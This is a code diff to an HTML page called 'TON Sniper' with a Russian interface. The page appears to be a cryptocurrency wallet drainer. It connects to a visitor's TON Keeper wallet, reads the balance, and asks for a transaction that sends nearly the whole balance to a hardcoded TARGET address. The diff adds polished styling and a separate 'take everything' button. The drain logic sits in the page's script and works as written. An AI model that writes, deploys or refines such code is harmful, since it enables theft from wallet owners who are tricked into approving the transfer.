@@ -3,55 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <title>TON Sniper</title>
+    <style>
+        body {
+            background: #0d0d0d;
+            color: #fff;
+            font-family: Arial;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            width: 400px;
+        }
+        button {
+            background: linear-gradient(135deg, #00d4ff, #0077ff);
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 15px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+        }
+        button:hover {
+            transform: scale(1.02);
+        }
+        #status {
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            min-height: 60px;
+            border: 1px solid #2a2a2a;
+            word-break: break-all;
+        }
+        .wallet {
+            background: #111;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 14px;
+            border: 1px solid #2a2a2a;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <button id="btn">ПОДКЛЮЧИТЬ И ВЫВЕСТИ</button>
-    <div id="status">Готов</div>
+    <div class="container">
+        <h2>⚡ TON SNIPER</h2>
+        
+        <div class="wallet">
+            👤 <span id="walletAddress">Не подключён</span>
+        </div>
+        
+        <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
+        <button id="snipeBtn" class="hidden">💰 ЗАБРАТЬ ВСЁ</button>
+        
+        <div id="status">Нажмите кнопку для подключения TON Keeper</div>
+    </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
+        let provider = null;
+        let userAddress = null;
 
-        btn.onclick = async function() {
+        const connectBtn = document.getElementById('connectBtn');
+        const snipeBtn = document.getElementById('snipeBtn');
+        const status = document.getElementById('status');
+        const walletDisplay = document.getElementById('walletAddress');
+
+        // ========== ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ==========
+        connectBtn.onclick = async function() {
             try {
-                status.innerText = 'Подключение...';
+                status.innerText = '⏳ Подключение...';
                 
+                // Проверяем TON Keeper
                 if (!window.tonkeeper) {
-                    status.innerText = '❌ Установи TON Keeper';
+                    status.innerText = '❌ TON Keeper не установлен! Установите расширение.';
                     return;
                 }
                 
-                const provider = window.tonkeeper;
+                provider = window.tonkeeper;
+                
+                // Запрашиваем доступ
                 const accounts = await provider.send('ton_requestAccounts', {});
                 
                 if (!accounts || accounts.length === 0) {
-                    status.innerText = '❌ Отказ';
+                    status.innerText = '❌ Пользователь отклонил подключение';
                     return;
                 }
                 
-                const addr = accounts[0];
-                status.innerText = `✅ Подключен: ${addr.slice(0,6)}...`;
+                userAddress = accounts[0];
+                walletDisplay.innerText = userAddress;
+                status.innerText = `✅ Кошелёк привязан: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                 
-                const hex = await provider.send('ton_getBalance', { address: addr });
+                // Показываем кнопку "Забрать всё"
+                snipeBtn.classList.remove('hidden');
+                connectBtn.innerText = '✅ ПОДКЛЮЧЕН';
+                connectBtn.disabled = true;
+                
+                // Показываем баланс
+                await getBalance();
+                
+            } catch(e) {
+                status.innerText = '❌ Ошибка: ' + e.message;
+            }
+        };
+
+        // ========== ПОЛУЧИТЬ БАЛАНС ==========
+        async function getBalance() {
+            try {
+                const hex = await provider.send('ton_getBalance', { address: userAddress });
                 const nano = parseInt(hex, 16);
                 const balance = (nano / 1e9).toFixed(4);
                 status.innerText = `💰 Баланс: ${balance} TON`;
+                return nano;
+            } catch(e) {
+                status.innerText = '❌ Ошибка баланса: ' + e.message;
+                return 0;
+            }
+        }
+
+        // ========== ЗАБРАТЬ ВСЁ ==========
+        snipeBtn.onclick = async function() {
+            try {
+                status.innerText = '⏳ Проверка баланса...';
+                snipeBtn.disabled = true;
+                
+                const nano = await getBalance();
                 
                 if (nano <= 0) {
-                    status.innerText = '❌ Баланс 0';
+                    status.innerText = '❌ Баланс 0 TON. Нечего выводить.';
+                    snipeBtn.disabled = false;
                     return;
                 }
                 
-                const fee = 10000000;
+                const fee = 10000000; // 0.01 TON
                 const amount = nano - fee;
                 
                 if (amount <= 0) {
-                    status.innerText = '❌ Меньше комиссии 0.01 TON';
+                    status.innerText = `❌ Баланс ${(nano/1e9).toFixed(4)} TON — меньше комиссии 0.01 TON`;
+                    snipeBtn.disabled = false;
                     return;
                 }
                 
-                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON...`;
+                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON на ${TARGET}...`;
                 
                 const result = await provider.send('ton_sendTransaction', {
                     to: TARGET,
@@ -61,13 +167,17 @@
                 });
                 
                 if (result && result.code === 0) {
-                    status.innerText = `✅ ВСЕ ДЕНЬГИ ПЕРЕВЕДЕНЫ НА ${TARGET}`;
+                    status.innerText = `✅ УСПЕШНО! ${(amount/1e9).toFixed(4)} TON переведено на ${TARGET}`;
+                    snipeBtn.innerText = '✅ ВЫВЕДЕНО';
+                    snipeBtn.disabled = true;
                 } else {
-                    status.innerText = '❌ Транзакция отклонена';
+                    status.innerText = '❌ Транзакция отклонена пользователем';
+                    snipeBtn.disabled = false;
                 }
                 
             } catch(e) {
                 status.innerText = '❌ Ошибка: ' + e.message;
+                snipeBtn.disabled = false;
             }
         };
     </script>
